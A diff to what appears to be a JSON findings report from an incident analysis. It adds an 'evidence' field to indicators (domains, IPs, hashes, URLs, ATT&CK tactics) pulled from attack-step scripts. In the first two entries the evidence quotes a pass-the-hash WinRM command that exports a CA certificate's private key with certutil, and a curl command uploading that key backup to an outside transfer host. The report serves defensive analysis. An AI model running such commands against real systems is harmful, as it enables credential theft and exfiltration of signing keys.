@@ -7,7 +7,8 @@
     "files": "20250301_104500_step07_exfil.sh",
     "attribution": null,
     "attack": "T1649",
-    "atlas": null
+    "atlas": null,
+    "evidence": "nxc winrm 10.20.1.23 -u administrator -H 88********c (32 chars) -x \"certutil -exportPFX -p Export1! My $CA_THUMB ca_backup.p12\" (20250301_104500_step07_exfil.sh:3)"
   },
   {
     "finding": "FileUpload",
@@ -17,7 +18,8 @@
     "files": "20250301_104500_step07_exfil.sh",
     "attribution": null,
     "attack": "T1048",
-    "atlas": "AML.T0025"
+    "atlas": "AML.T0025",
+    "evidence": "curl -s -T 20250301_104100_ca_backup.p12 https://transfer.example.net/upload (20250301_104500_step07_exfil.sh:4)"
   },
   {
     "finding": "Domain",
@@ -27,7 +29,8 @@
     "files": "20250301_103200_step05_certs.sh",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "Domain",
@@ -37,7 +40,8 @@
     "files": "20250301_101530_step01_recon.txt, 20250301_103200_step05_certs.sh, 20250301_103240_certipy_find.txt",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "Domain",
@@ -47,7 +51,8 @@
     "files": "20250301_101800_step02_enum.sh, 20250301_101845_step02_enum.log, 20250301_102300_step03_adsync.sh, 20250301_102700_step03_adsync_v2.sh, 20250301_103200_step05_certs.sh, 20250301_103240_certipy_find.txt, 20250301_104000_step06_auth.sh, 20250301_104010_step06_auth.txt",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "Domain",
@@ -57,7 +62,8 @@
     "files": "20250301_104500_step07_exfil.sh",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "Email",
@@ -67,7 +73,8 @@
     "files": "20250301_103200_step05_certs.sh",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "Email",
@@ -77,7 +84,8 @@
     "files": "20250301_103200_step05_certs.sh, 20250301_103240_certipy_find.txt, 20250301_104010_step06_auth.txt",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "IPv4",
@@ -87,7 +95,8 @@
     "files": "20250301_101530_step01_recon.txt, 20250301_101800_step02_enum.sh, 20250301_101845_step02_enum.log, 20250301_102300_step03_adsync.sh, 20250301_102700_step03_adsync_v2.sh, adsync_1740824625.txt",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "IPv4",
@@ -97,7 +106,8 @@
     "files": "20250301_101530_step01_recon.txt, 20250301_101800_step02_enum.sh, 20250301_101845_step02_enum.log, 20250301_104000_step06_auth.sh, 20250301_104500_step07_exfil.sh",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "IPv4",
@@ -107,17 +117,19 @@
     "files": "20250301_101530_step01_recon.txt, 20250301_101800_step02_enum.sh, 20250301_101845_step02_enum.log, 20250301_103200_step05_certs.sh, 20250301_104000_step06_auth.sh",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "MD5",
     "severity": "high",
     "tactic": "CredentialAccess, Exfiltration",
-    "indicator": "8846f7eaee8fb117ad06bdd830b7586c",
+    "indicator": "88********c (32 chars)",
     "files": "20250301_104000_step06_auth.sh, 20250301_104010_step06_auth.txt, 20250301_104500_step07_exfil.sh",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "MD5",
@@ -127,7 +139,8 @@
     "files": "20250301_104010_step06_auth.txt",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "SHA1",
@@ -137,7 +150,8 @@
     "files": "20250301_104030_ca_store.txt, 20250301_104500_step07_exfil.sh",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "URL",
@@ -147,7 +161,8 @@
     "files": "20250301_104500_step07_exfil.sh",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "URL",
@@ -157,7 +172,8 @@
     "files": "20250301_101800_step02_enum.sh",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "tactic",
@@ -167,7 +183,8 @@
     "files": "20250301_101800_step02_enum.sh, 20250301_102300_step03_adsync.sh, 20250301_103200_step05_certs.sh, 20250301_104000_step06_auth.sh, 20250301_104500_step07_exfil.sh",
     "attribution": null,
     "attack": "TA0006",
-    "atlas": "AML.TA0013"
+    "atlas": "AML.TA0013",
+    "evidence": null
   },
   {
     "finding": "tactic",
@@ -177,7 +194,8 @@
     "files": "20250301_104500_step07_exfil.sh",
     "attribution": null,
     "attack": "TA0010",
-    "atlas": "AML.TA0010"
+    "atlas": "AML.TA0010",
+    "evidence": null
   },
   {
     "finding": "tactic",
@@ -187,7 +205,8 @@
     "files": "20250301_102700_step03_adsync_v2.sh",
     "attribution": null,
     "attack": "TA0002",
-    "atlas": "AML.TA0005"
+    "atlas": "AML.TA0005",
+    "evidence": null
   },
   {
     "finding": "Domain",
@@ -197,7 +216,8 @@
     "files": "adsync_1740824865.txt",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "Domain",
@@ -207,7 +227,8 @@
     "files": "20250301_101530_step01_recon.txt",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "Domain",
@@ -217,7 +238,8 @@
     "files": "adsync_1740824865.txt",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "Domain",
@@ -227,7 +249,8 @@
     "files": "20250301_101530_step01_recon.txt",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "Domain",
@@ -237,7 +260,8 @@
     "files": "20250301_101530_step01_recon.txt",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "Email",
@@ -247,7 +271,8 @@
     "files": "adsync_1740824865.txt",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "IPv4",
@@ -257,7 +282,8 @@
     "files": "20250301_101500_step01_recon.sh",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "URL",
@@ -267,7 +293,8 @@
     "files": "20250301_101530_step01_recon.txt",
     "attribution": null,
     "attack": null,
-    "atlas": null
+    "atlas": null,
+    "evidence": null
   },
   {
     "finding": "tactic",
@@ -277,6 +304,7 @@
     "files": "20250301_101500_step01_recon.sh, 20250301_101800_step02_enum.sh",
     "attribution": null,
     "attack": "TA0007",
-    "atlas": "AML.TA0008"
+    "atlas": "AML.TA0008",
+    "evidence": null
   }
 ]
